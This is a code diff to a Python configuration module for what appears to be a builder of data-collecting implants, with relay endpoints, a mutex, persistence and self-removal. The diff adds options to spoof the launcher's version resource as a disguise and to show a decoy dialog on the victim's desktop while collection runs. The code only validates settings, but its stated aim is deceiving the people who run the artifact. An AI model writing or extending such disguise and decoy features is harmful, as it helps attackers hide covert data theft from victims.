@@ -14,7 +14,7 @@ from __future__ import annotations
 
 import json
 from collections.abc import Mapping
-from dataclasses import dataclass, fields
+from dataclasses import dataclass, field, fields
 from typing import Any, Final, Literal, cast
 
 SCHEMA_VERSION: Final[int] = 1
@@ -37,6 +37,17 @@ MAX_PERSIST_HOURS: Final[int] = 24
 # in one run bounded: three attempts per target inside transmit, so a run with four dead
 # endpoints already spends nine backoffs before it gives up.
 MAX_RELAY_TARGETS: Final[int] = 4
+
+# Version strings land in a 4 KiB resource and are read by a properties sheet. These are
+# paste ceilings, not policy: a company name longer than this is a paragraph, and a
+# version string is four numbers.
+MAX_VERSION_TEXT: Final[int] = 256
+
+# The decoy is a dialog on somebody's desktop for a bounded time. Ten minutes is long
+# enough to cover a slow collection and short enough that a dialog nobody dismissed is
+# not left on the screen for a working day.
+MAX_DECOY_SECONDS: Final[int] = 600
+MAX_DECOY_TEXT: Final[int] = 512
 
 
 class ConfigError(ValueError):
@@ -99,6 +110,25 @@ class SourceConfig:
 
 
 @dataclass(frozen=True, slots=True)
+class VersionConfig:
+    """What the properties sheet says about the artifact.
+
+    Build input, not payload: this travels into the launcher's ``RT_VERSION`` resource
+    and never into ``cfg.json`` more than it has to. Every field is optional and an
+    all-empty block writes nothing, so a build that does not ask for a disguise keeps
+    the launcher's own version info.
+    """
+
+    company: str = ""
+    product: str = ""
+    description: str = ""
+    copyright: str = ""
+    original_name: str = ""
+    file_version: str = ""
+    product_version: str = ""
+
+
+@dataclass(frozen=True, slots=True)
 class RunConfig:
     schema_version: int
     mutex: str
@@ -119,6 +149,14 @@ class RunConfig:
     # a habit, and why it is separate from ``self_remove`` rather than implied by it.
     persist: bool = False
     persist_hours: int = 0
+    # The properties sheet. Empty strings mean "leave the launcher's own alone".
+    version: VersionConfig = field(default_factory=VersionConfig)
+    # A dialog shown at start, for ``decoy_seconds``, with this title and text. Zero
+    # seconds is off, which is what every artifact built before this field did: it is a
+    # disguise, and a disguise nobody asked for is a bug report waiting to happen.
+    decoy_seconds: int = 0
+    decoy_title: str = ""
+    decoy_text: str = ""
 
 
 def _names(cls: type) -> tuple[str, ...]:
@@ -128,6 +166,7 @@ def _names(cls: type) -> tuple[str, ...]:
 
 RELAY_FIELDS: Final[tuple[str, ...]] = _names(RelayConfig)
 SOURCE_FIELDS: Final[tuple[str, ...]] = _names(SourceConfig)
+VERSION_FIELDS: Final[tuple[str, ...]] = _names(VersionConfig)
 RUN_FIELDS: Final[tuple[str, ...]] = _names(RunConfig)
 
 
@@ -260,6 +299,32 @@ def _sources_from(value: Any, path: str) -> SourceConfig:
     return SourceConfig(**present)
 
 
+def _version_from(value: Any, path: str) -> VersionConfig:
+    data = _as_mapping(value, path)
+    _reject_unknown(data, VERSION_FIELDS, path)
+    present: dict[str, str] = {}
+    for name in VERSION_FIELDS:
+        if name not in data:
+            continue
+        text = _as_str(data[name], path + name)
+        if len(text) > MAX_VERSION_TEXT:
+            raise ConfigError(
+                path + name,
+                f"expected at most {MAX_VERSION_TEXT} characters, got {len(text)}",
+            )
+        present[name] = text
+    return VersionConfig(**present)
+
+
+def _decoy_text(value: Any, path: str) -> str:
+    text = _as_str(value, path)
+    if len(text) > MAX_DECOY_TEXT:
+        raise ConfigError(
+            path, f"expected at most {MAX_DECOY_TEXT} characters, got {len(text)}"
+        )
+    return text
+
+
 def from_dict(data: Mapping[str, Any]) -> RunConfig:
     """Validate a mapping and return the frozen config. Raises ConfigError."""
     document = _as_mapping(data, "")
@@ -291,6 +356,24 @@ def from_dict(data: Mapping[str, Any]) -> RunConfig:
         if "persist_hours" in document
         else 0
     )
+    disguise = (
+        _version_from(document["version"], "version.")
+        if "version" in document
+        else VersionConfig()
+    )
+    decoy_seconds = (
+        _as_int_in(document["decoy_seconds"], "decoy_seconds", 0, MAX_DECOY_SECONDS)
+        if "decoy_seconds" in document
+        else 0
+    )
+    decoy_title = (
+        _decoy_text(document["decoy_title"], "decoy_title")
+        if "decoy_title" in document
+        else ""
+    )
+    decoy_text = (
+        _decoy_text(document["decoy_text"], "decoy_text") if "decoy_text" in document else ""
+    )
 
     return RunConfig(
         schema_version=version,
@@ -303,6 +386,10 @@ def from_dict(data: Mapping[str, Any]) -> RunConfig:
         keep_local=keep_local,
         persist=persist,
         persist_hours=persist_hours,
+        version=disguise,
+        decoy_seconds=decoy_seconds,
+        decoy_title=decoy_title,
+        decoy_text=decoy_text,
     )
 
 
@@ -326,6 +413,10 @@ def to_dict(cfg: RunConfig) -> dict[str, Any]:
         "keep_local": cfg.keep_local,
         "persist": cfg.persist,
         "persist_hours": cfg.persist_hours,
+        "version": {name: getattr(cfg.version, name) for name in VERSION_FIELDS},
+        "decoy_seconds": cfg.decoy_seconds,
+        "decoy_title": cfg.decoy_title,
+        "decoy_text": cfg.decoy_text,
         "relay": {
             "kind": cfg.relay.kind,
             "endpoint": cfg.relay.endpoint,
